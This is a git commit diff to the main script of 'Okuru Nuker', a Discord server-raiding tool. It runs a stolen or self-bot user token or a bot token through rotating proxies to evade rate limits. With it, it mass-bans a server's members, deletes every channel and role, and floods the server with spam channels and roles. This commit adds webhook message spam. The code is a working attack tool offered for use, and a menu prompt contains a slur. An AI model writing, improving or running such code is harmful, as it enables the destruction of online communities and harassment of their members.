569e208cbfe84034d1af6c8057d93643fbe045fd
Gowixx <57415348+Gowixx@users.noreply.github.com>
2021-04-24 21:51:07 -0400

    big changes

--- main.py
+++ main.py
@@ -1,15 +1,23 @@
-
-import requests
-import os
-import PyAuthGG
-import threading, time
-import discord
+import os, sys, threading, time, discord, requests, colorama, random, json
 from discord.ext import commands
 from colorama import Fore
 from itertools import cycle
 
-os.system(f'mode 99,29')
-os.system(f'title [Okuru Nuker] - Loading Proxies')
+
+
+
+config = json.load(open('config.json'))
+
+prefix = config["General"]["Prefix"]
+token = config["General"]["Token"]
+guild = config["General"]["Guild To Nuke"]
+
+wh_spam = config["Webhook Spam"]["Spam"]
+wh_spam_names = config["Webhook Spam"]["Webhook Names"]
+wh_spam_contents = config["Webhook Spam"]["Message Contents"]
+wh_spam_amount = config["Webhook Spam"]["Spam Amount"]
+
+os.system('title [Okuru Nuker] - Loading')
 
 def versionCheck():
     if discord.__version__ != '1.4.0':
@@ -24,14 +32,15 @@ def versionCheck():
             print(f"\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;15m Couldn't install discord 1.4, make sure you have python in path")
             input()
             os._exit(0)
+
 os.system(f'title [Okuru Nuker] - Version Check')
 versionCheck()
 
-
-proxies = []
-members = open('Scraped/members.json')
-channels = open('Scraped/channels.json')
-roles = open('Scraped/roles.json')
+os.system('title [Okuru Nuker] - Loading Scraped')
+proxies = open('proxies.okuru').read().split('\n')
+members = open('Scraped/members.okuru').read().split('\n')
+channels = open('Scraped/channels.okuru').read().split('\n')
+roles = open('Scraped/roles.okuru').read().split('\n')
 
 def clear():
   if os.name == 'nt':
@@ -39,21 +48,15 @@ def clear():
   else:
     os.system('clear')
 
-for line in open('proxies.json'):
-    proxies.append(line.replace('\n', ''))
-
 
 print(f'{Fore.LIGHTBLUE_EX}[INFO] \u001b[38;5;253mFinished Loading Proxies')
 time.sleep(1)
 proxs = cycle(proxies)
 
-os.system('title [Okuru Nuker] - Input')
-token = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Token: ")
-guild = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Guild ID: ")
-prefix = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Prefix: ")
+
 
 def check_token(token: str) -> str:
-    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
+    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code == 200:
         return "user"
     else:
         return "bot"
@@ -62,72 +65,105 @@ def check_token(token: str) -> str:
 token_type = check_token(token)
 
 if token_type == "user":
-    headers = {'Authorization': f'{token}'}
-    client = commands.Bot(command_prefix=prefix,
-                          case_insensitive=False,
-                          self_bot=True)
+    headers = {'Authorization': token}
+    client = commands.Bot(
+        command_prefix=prefix,
+        case_insensitive=False,
+        self_bot=True
+        )
 elif token_type == "bot":
     headers = {'Authorization': f'Bot {token}'}
-    client = commands.Bot(command_prefix=prefix, case_insensitive=False)
+    client = commands.Bot(
+        command_prefix=prefix, 
+        case_insensitive=False
+        )
 
 
 
 def ban(i):
-    r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}",
+    r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
                      proxies={"http": 'http://' + next(proxs)},
                      headers=headers)
     if r.status_code == 429:
-        print(f"\u001b[38;5;196m[MassBan]\u001b[38;5;253m => Proxy Limited For {r.json()['retry_after']}")
+        sys.stdout.write(f"\u001b[38;5;196m[MassBan]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         ban(i)
     elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-        print(f'{Fore.LIGHTGREEN_EX}[Massban]\u001b[38;5;253m => Banned {i}')
+        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[Massban]\u001b[38;5;253m => Banned {i}\n')
 
 
 def chandel(u):
-    r = requests.delete(f"https://discord.com/api/v8/channels/{u}",
+    r = requests.delete(f"https://discord.com/api/v9/channels/{u}",
                      proxies={"http": 'http://' + next(proxs)},
                      headers=headers)
     if r.status_code == 429:
-        print(f"\u001b[38;5;196m[ChannelDeletion]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
+        sys.stdout.write(f"\u001b[38;5;196m[ChannelDeletion]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         chandel(u)
     elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-        print(f'{Fore.LIGHTGREEN_EX}[ChannelDeletion]\u001b[38;5;253m => Deleted => {u}')
+        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[ChannelDeletion]\u001b[38;5;253m => Deleted => {u}\n')
 
 
 def roledel(k):
-    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{k}",
+    r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{k}",
                      proxies={"http": 'http://' + next(proxs)},
                      headers=headers)
     if r.status_code == 429:
-        print(f"\u001b[38;5;196m[RoleDeletion]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
+        sys.stdout.write(f"\u001b[38;5;196m[RoleDeletion]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         roledel(k)
     elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-        print(f'{Fore.LIGHTGREEN_EX}[RoleDeletion]\u001b[38;5;253m => Deleted {k}')
+        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[RoleDeletion]\u001b[38;5;253m => Deleted {k}\n')
 
+def makewebhook(channel):
+    try:
+        json = {
+            'name': random.choice(wh_spam_names),
+        }
+        r = requests.post(
+            f'https://discord.com/api/v8/channels/{channel}/webhooks',
+            headers=headers,
+            json=json,
+            proxies={"http": 'http://' + next(proxs)})
+        wh_id = r.json()['id']
+        wh_token = r.json()['token']
+        return f'https://discord.com/api/webhooks/{wh_id}/{wh_token}'
+    except:
+        pass
+
+def sendwebhook(webhook):
+    try:
+        for i in range(wh_spam_amount):
+            payload={
+                'username': random.choice(wh_spam_names),
+                'content': random.choice(wh_spam_contents)
+            }
+            requests.post(webhook, json=payload, proxies={"http": 'http://' + next(proxs)})
+    except:
+        pass
 
 def spamchannel(name):
     json = {'name': name, 'type': 0}
-    r = requests.post(f"https://discord.com/api/v8/guilds/{guild}/channels",
+    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",
                      proxies={"http": 'http://' + next(proxs)},
                      headers=headers, json=json)
     if r.status_code == 429:
-        print(f"\u001b[38;5;196m[ChannelSpam]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
+        sys.stdout.write(f"\u001b[38;5;196m[ChannelSpam]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         spamchannel(name)
     elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-        print(f'{Fore.LIGHTGREEN_EX}[ChannelSpam]\u001b[38;5;253m => Created {name}')
-
+        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[ChannelSpam]\u001b[38;5;253m => Created {name}\n')
+        if wh_spam:
+            webhook = makewebhook(r.json()['id'])
+            threading.Thread(target=sendwebhook, args=(webhook,)).start()
 
 
 def spamrole(role):
     json = {'name': role, 'type': 0}
-    r = requests.post(f"https://discord.com/api/v8/guilds/{guild}/roles",
+    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",
                      proxies={"http": 'http://' + next(proxs)},
                      headers=headers, json=json)
     if r.status_code == 429:
-        print(f"\u001b[38;5;196m[RoleSpam]\u001b[38;5;253m => Proxy Ratelimited For {r.json()['retry_after']}")
+        sys.stdout.write(f"\u001b[38;5;196m[RoleSpam]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         spamrole(role)
     elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-        print(f'{Fore.LIGHTGREEN_EX}[RoleSpam]\u001b[38;5;253m => Created {role}')
+        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[RoleSpam]\u001b[38;5;253m => Created {role}\n')
 
 
 def nukecmd():
@@ -142,17 +178,18 @@ def nukecmd():
   print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Nuking Server...")
   for m in members:
     threading.Thread(target=ban, args=(m, )).start()
-    for c in channels:
-      threading.Thread(target=chandel, args=(c, )).start()
-      for r in roles:
-        threading.Thread(target=roledel, args=(r, )).start()
-        for i in range(int(amount)):
-          threading.Thread(target=spamchannel, args=(name, )).start()
-          for i in range(int(amount)):
-            threading.Thread(target=spamrole, args=(role, )).start()
-            time.sleep(4)
-            clear()
-            menu()
+  for c in channels:
+    threading.Thread(target=chandel, args=(c, )).start()
+  for r in roles:
+    threading.Thread(target=roledel, args=(r, )).start()
+  for i in range(int(amount)):
+    threading.Thread(target=spamchannel, args=(name, )).start()
+  for i in range(int(amount)):
+    threading.Thread(target=spamrole, args=(role, )).start()
+  print('Finished, Going back in 3 seconds') 
+  time.sleep(3)
+  clear()
+  menu()
 
 os.system(f'title [Okuru Nuker] - Menu')
 
@@ -172,15 +209,20 @@ def menu():
 
 			\u001b[38;5;33m'''.center(os.get_terminal_size().columns))
 
-
-    choice = int(input('[ > ] '))
+    try:
+        choice = int(input('[ > ] '))
+    except:
+        print('that\'s not a number retard')
+        time.sleep(3)
+        menu()
     if choice == 1:
         clear()
         os.system(f'title [Okuru Nuker] - Banning members')
         print("[OKURU:INFO] Starting to Ban Members")
         for m in members:
             threading.Thread(target=ban, args=(m, )).start()
-        time.sleep(4)
+        print('Finished, Going back in 3 seconds') 
+        time.sleep(3)
         clear()
         menu()
     elif choice == 2:
@@ -189,7 +231,8 @@ def menu():
         print("[OKURU:INFO] Starting to Delete Channels")
         for c in channels:
             threading.Thread(target=chandel, args=(c, )).start()
-        time.sleep(4)
+        print('Finished, Going back in 3 seconds') 
+        time.sleep(3)
         clear()
         menu()
     elif choice == 3:
@@ -198,7 +241,8 @@ def menu():
         print("[OKURU:INFO] Starting to Delete Roles")
         for r in roles:
             threading.Thread(target=roledel, args=(r, )).start()
-        time.sleep(4)
+        print('Finished, Going back in 3 seconds') 
+        time.sleep(3)
         clear()
         menu()
     elif choice == 4:
@@ -210,7 +254,8 @@ def menu():
         amount = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ")
         for i in range(int(amount)):
             threading.Thread(target=spamchannel, args=(name, )).start()
-        time.sleep(4)
+        print('Finished, Going back in 3 seconds') 
+        time.sleep(3)
         clear()
         menu()
     elif choice == 5:
@@ -222,7 +267,8 @@ def menu():
         amount = input("\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ")
         for i in range(int(amount)):
             threading.Thread(target=spamrole, args=(role, )).start()
-        time.sleep(2)
+        print('Finished, Going back in 3 seconds') 
+        time.sleep(3)
         clear()
         menu()
     elif choice == 6:
@@ -231,7 +277,7 @@ def menu():
       nukecmd()
     elif choice == 7:
         clear()
-        print("\u001b[38;5;21m[?]\u001b[38;5;15m This Nuker was made by ; Yum, Gowixx, Aced.")
+        print("\u001b[38;5;21m[?]\u001b[38;5;15m This Nuker was made by ; Gowixx, Yum, Aced.")
         print("\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.")
         input()
         menu()
@@ -244,64 +290,68 @@ async def scrape(ctx):
     await ctx.message.delete()
 
     try:
-        os.remove("Scraped/members.json")
-        os.remove("Scraped/channels.json")
-        os.remove("Scraped/roles.json")
+        os.remove("Scraped/members.okuru")
+        os.remove("Scraped/channels.okuru")
+        os.remove("Scraped/roles.okuru")
     except:
         pass
 
     membercount = 0
-    with open('Scraped/members.json', 'a') as f:
+    with open('Scraped/members.okuru', 'a') as f:
         for member in ctx.guild.members:
             f.write(str(member.id) + "\n")
             membercount += 1
         print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{membercount}\033[37m Members")
 
     channelcount = 0
-    with open('Scraped/channels.json', 'a') as f:
+    with open('Scraped/channels.okuru', 'a') as f:
         for channel in ctx.guild.channels:
             f.write(str(channel.id) + "\n")
             channelcount += 1
         print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{channelcount}\033[37m Channels")
 
     rolecount = 0
-    with open('Scraped/roles.json', 'a') as f:
+    with open('Scraped/roles.okuru', 'a') as f:
         for role in ctx.guild.roles:
             f.write(str(role.id) + "\n")
             rolecount += 1
         print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{rolecount}\033[37m Roles")
 
-    time.sleep(2)
-    await menu()
+    print('Finished, Going back in 3 seconds') 
+    time.sleep(3)
+    menu()
 
 
 @client.event
 async def on_ready():
     if token_type == "bot":
-        try:
-            menu()
-        except:
-            pass
+        menu()
 
 
 @client.event
+async def on_error(ctx, error):
+    return
+@client.event
 async def on_connect():
     if token_type == "user":
-        try:
-            menu()
-        except:
-            pass
+        menu()
 
 
 def Startup():
     try:
         if token_type == "user":
             os.system('cls')
-            client.run(token, bot=False)
+            client.run(
+                token, 
+                bot=False
+            )
+
         elif token_type == "bot":
-            client.run(token)
+            client.run(
+                token
+            )
     except:
-        print(f"{Fore.RED}[?]\u001b[38;5;253m Invalid Token Or Rate Limited.")
+        print(f"{Fore.RED}[?]\u001b[38;5;253m Invalid Token (Could be rate-limited)")
 
 if __name__ == "__main__":
     Startup()
